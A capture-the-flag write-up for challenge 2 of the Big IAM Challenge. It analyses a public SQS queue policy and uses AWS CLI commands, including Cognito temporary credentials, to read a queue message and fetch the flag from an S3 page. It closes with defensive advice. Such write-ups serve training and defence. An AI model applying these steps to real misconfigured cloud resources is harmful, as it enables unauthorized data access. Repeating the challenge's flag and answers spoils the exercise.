## Big IAM Challenge: Challenge 2 Writeup

### Challenge Number 2

### Challenge Statement
The goal of this challenge was to capture the flag by identifying and exploiting overly permissive IAM policies related to AWS SQS (Simple Queue Service). Participants needed to analyze the policy, obtain temporary credentials, interact with the SQS queue using the AWS CLI, and retrieve the flag from a message in the queue.

### IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

### Short Analysis of the IAM Policy
- What do I have access to?
  - The policy allows anyone (`Principal: "*"`) to send messages (`sqs:SendMessage`) and receive messages (`sqs:ReceiveMessage`) from the specified SQS queue.
- What don't I have access to?
  - Other actions like deleting the queue, purging messages, or modifying queue attributes are not permitted.
- What is interesting?
  - The queue is publicly accessible, meaning anyone can send and receive messages, which could lead to unauthorized access.

### Solution
#### Step 1: Obtain Identity Information
To verify permissions, I attempted to retrieve caller identity:
```sh
aws sts get-caller-identity --profile challenge2
```
This resulted in an error:
```
The config profile (challenge2) could not be found
```

#### Step 2: Configure AWS Profile
Since the profile was missing, I configured it manually:
```sh
aws configure --profile challenge2
```
The system prompted for credentials:
```
AWS Access Key ID [None]: <entered access key>
AWS Secret Access Key [None]: <entered secret key>
Default region name [None]: us-east-1
Default output format [None]: json
```

#### Step 3: Retrieve Temporary Credentials
Using Amazon Cognito, I obtained temporary credentials:
```sh
aws cognito-identity get-id --identity-pool-id "us-east-1:c6f3eb2e-3cb5-404e-93bc-f0bdf7ad042e"
```
I then retrieved credentials for the identity:
```sh
aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:9ea8f9af-f687-439b-951d-0e83653f6be7"
```

#### Step 4: Verify Permissions
With the temporary credentials, I verified the caller identity again:
```sh
aws sts get-caller-identity --profile challenge2
```
This time, it returned an ARN confirming our authenticated identity.

#### Step 5: Send a Message to the Queue
I used the following command to send a test message:
```sh
aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --message-body "Hello, World" --profile challenge2 --region us-east-1
```

#### Step 6: Receive the Message Containing the Flag
Next, retrieved the message from the queue:
```sh
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --profile challenge2 --region us-east-1
```
This response contained a JSON message body with a URL:
```json
{
    "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\"}"
}
```

#### Step 7: Access the URL to Retrieve the Flag
Navigate to the provided URL:
```
https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
```
Inside the HTML file, we found the flag:
```
{wiz:you-are-at-the-front-of-the-queue}
```

### Step 8: Submit the Flag
After submitting the flag in the challenge portal, it shows success thats how I successfully completed Challenge 2.

### Reflection
- Approach:
  - I analyzed the IAM policy, obtained temporary credentials, interacted with the queue, and retrieved the flag.
- Challenges:
  - The missing AWS profile and access denial when listing queues.
- How I overcame challenges:
  - Manually configuring the profile and directly targeting the queue using the queue URL.
- Breakthrough:
  - Realizing that even without listing queues, we could still interact with a known queue.

### Defensive Recommendations
- Avoid overly permissive IAM policies (e.g., `Principal: "*"`).
- Restrict access to trusted IAM users and roles.
- Encrypt sensitive data to prevent exposure.
- Regularly audit IAM policies and remove unnecessary permissions.
- Use least privilege principles when assigning permissions.

This concludes the writeup for Challenge 2 in The Big IAM Challenge!

